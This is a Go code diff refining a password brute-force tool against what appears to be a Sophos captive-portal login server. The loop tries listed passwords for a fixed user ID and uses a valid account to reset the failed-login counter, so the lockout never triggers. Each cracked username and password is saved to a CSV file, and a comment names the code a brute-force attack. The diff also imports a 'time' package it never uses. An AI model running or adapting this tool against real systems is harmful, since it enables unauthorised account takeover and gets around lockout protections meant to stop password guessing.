@@ -10,6 +10,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 )
 
 const (
@@ -17,7 +18,6 @@ const (
 	logoutURL = "http://172.16.68.6:8090/logout.xml"
 )
 
-// Requestresponse represents the structure of the XML response from the server
 type Requestresponse struct {
 	XMLName       xml.Name `xml:"requestresponse"`
 	Text          string   `xml:",chardata"`
@@ -101,10 +101,10 @@ func resetLogins(correctUsername, correctPassword string) error {
 
 func main() {
 	// Retrieve username and password from environment variables
-	username := os.Getenv("SOPHOS_USERNAME")
-	password := os.Getenv("SOPHOS_PASSWORD")
+	correctUsername := os.Getenv("SOPHOS_USERNAME")
+	correctPassword := os.Getenv("SOPHOS_PASSWORD")
 
-	if username == "" || password == "" {
+	if correctUsername == "" || correctPassword == "" {
 		log.Fatalln("Environment variables SOPHOS_USERNAME and SOPHOS_PASSWORD must be set")
 	}
 
@@ -134,36 +134,39 @@ func main() {
 	csvWriter := csv.NewWriter(csvFile)
 	defer csvWriter.Flush()
 
-	var wrongAttempts = 0
-	for i := 19102158; i <= 19102158; i++ {
-		for _, pwd := range passwords {
-			// reset to prevent timeout due to too many bad login attempts
-			if wrongAttempts == 4 {
-				wrongAttempts = 0
-				err := resetLogins(username, password)
-				if err != nil {
-					log.Fatalln(err)
-				}
-			}
+	var wrongAttempts int
+	userID := 19102158 // Example user ID for brute-force attack
 
-			fmt.Println(fmt.Sprint(i), fmt.Sprint(pwd[0]))
-			res, err := login(fmt.Sprint(i), fmt.Sprint(pwd[0]))
+	for _, pwd := range passwords {
+		if wrongAttempts >= 4 {
+			wrongAttempts = 0
+			err := resetLogins(correctUsername, correctPassword)
+			if err != nil {
+				log.Fatalln(err)
+			}
+		}
+
+		username := fmt.Sprintf("%d", userID)
+		password := pwd[0]
+
+		fmt.Printf("Trying username: %s with password: %s\n", username, password)
+		res, err := login(username, password)
+		if err != nil {
+			log.Println(err)
+			wrongAttempts++
+			continue
+		} else {
+			_, err = logout(username)
 			if err != nil {
 				log.Println(err)
-				wrongAttempts++
-				continue
-			} else {
-				_, err = logout(username)
-				if err != nil {
-					log.Println(err)
-				}
-				err := csvWriter.Write([]string{fmt.Sprint(i), pwd[0]})
-				if err != nil {
-					log.Fatalln(err)
-				}
-				fmt.Println(res)
-				break
 			}
+			err = csvWriter.Write([]string{username, password})
+			if err != nil {
+				log.Fatalln(err)
+			}
+			csvWriter.Flush()
+			fmt.Println("Login successful:", res)
+			break
 		}
 	}
 }
